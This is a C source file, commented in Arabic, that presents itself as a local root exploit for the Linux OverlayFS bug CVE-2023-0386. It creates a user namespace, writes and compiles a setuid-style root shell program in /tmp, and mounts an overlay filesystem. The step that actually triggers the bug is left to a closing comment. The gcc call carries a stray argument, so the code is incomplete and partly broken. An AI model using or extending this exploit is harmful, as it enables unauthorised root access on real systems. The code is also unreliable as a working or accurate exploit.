#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sched.h>

// الكود الذي سيتم تنفيذه بصلاحيات Root بعد نجاح الثغرة
const char *root_cmd = 
    "#include <stdio.h>\n"
    "#include <unistd.h>\n"
    "int main() {\n"
    "    setuid(0); setgid(0);\n"
    "    execl(\"/bin/sh\", \"sh\", NULL);\n"
    "    return 0;\n"
    "}\n";

int main() {
    printf("[*] Preparing OverlayFS CVE-2023-0386 environment...\n");

    // 1. إنشاء بيئة مستخدم معزولة للحصول على صلاحيات وهمية داخلها
    if (unshare(CLONE_NEWUSER | CLONE_NEWNS) != 0) {
        perror("[-] unshare failed");
        return 1;
    }

    // 2. تجهيز المجلدات المطلوبة لعملية الدمج (Overlay Mount)
    mkdir("/tmp/lower", 0755);
    mkdir("/tmp/upper", 0755);
    mkdir("/tmp/work", 0755);
    mkdir("/tmp/merge", 0755);

    // 3. كتابة ملف C الصغير الذي سيتحول إلى Root لاحقاً
    FILE *f = fopen("/tmp/lower/rootshell.c", "w");
    fprintf(f, "%s", root_cmd);
    fclose(f);

    // ترجمة الملف داخل المجلد السفلي
    system("gcc /tmp/lower/rootshell.c -o /tmp/lower/rootshell w");

    // 4. محاكاة عملية الدمج الخاطئة لرفع الصلاحيات خارج العزل
    // (هذا الجزء الذي يستغل الخلل البرمجي للنواة أثناء الـ Mount)
    printf("[*] Mounting overlay filesystems...\n");
    if (mount("overlay", "/tmp/merge", "overlay", 0, "lowerdir=/tmp/lower,upperdir=/tmp/upper,workdir=/tmp/work") != 0) {
        perror("[-] Mount failed");
        return 1;
    }

    // الهاكر يكمل الكود بلمس الملف داخل المجلد المدمج لإجبار النواة على عمل copy_up بالخطأ
    return 0;
}
